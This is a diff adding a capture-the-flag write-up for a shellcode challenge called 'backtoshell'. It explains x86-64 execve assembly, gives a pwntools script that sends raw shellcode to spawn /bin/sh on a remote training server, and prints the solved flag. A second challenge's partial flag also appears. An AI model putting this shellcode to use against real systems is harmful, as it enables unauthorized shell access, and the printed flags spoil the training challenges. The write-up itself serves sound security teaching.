@@ -1,4 +1,40 @@
 ## backtoshell
+Really easy shellcode challenge, where we have a read of 0x200 bytes and after that every register is set to 0, then the code jumps to the buffer in which our input has been stored and executes it.
+
+The main issue (easily bypassable) is the zeroing of the registers, also rsp, so we can't use the stack in our shellcode.
+
+After trying some fancy reads, I realized that one of the simplest execve shellcode would be enough, the only problem was where to store the /bin/sh string. Without making it complex, if we put this string after the system call, we dont' care about possible errors, because we will already have our shell.
+
+So let's write some assembly, knowing that in rax we will initially have the starting address of the buffer:
+
+```assembly
+mov rdi, rax    ; save the starting address for later
+mov rax, 0x3b   ; id of the execve syscall
+add rdi, 22     ; offset where /bin/sh will be (count shellcode bytes)
+xor rsi, rsi    ; put rsi to 0
+xor rdx, rdx    ; put rdx to 0
+syscall         ; actual call
+```
+This is the script:
+
+```python
+from pwn import *
+
+context.terminal = ['terminator', '-e']
+
+r = remote("training.jinblack.it", 3001)
+
+#input("wait")
+
+execve = b"\x48\x89\xC7\x48\xC7\xC0\x3B\x00\x00\x00\x48\x83\xC7\x16\x48\x31\xF6\x48\x31\xD2\x0F\x05/bin/sh\x00"
+#we can count 22 bytes before /bin/sh
+
+r.send(execve)
+r.interactive()
+```
+
+And this is the flag: **flag{Congratulation_you_got_aa_working_shellcode_!}**
+
 ## keycheck_baby
 After a rapid analysis we can see that it's a classic input guessing challenge. We can open it with Ghidra, and with a simple Python script we easily get the first part of the flag: flag{y0u_d4_qu33n_
 
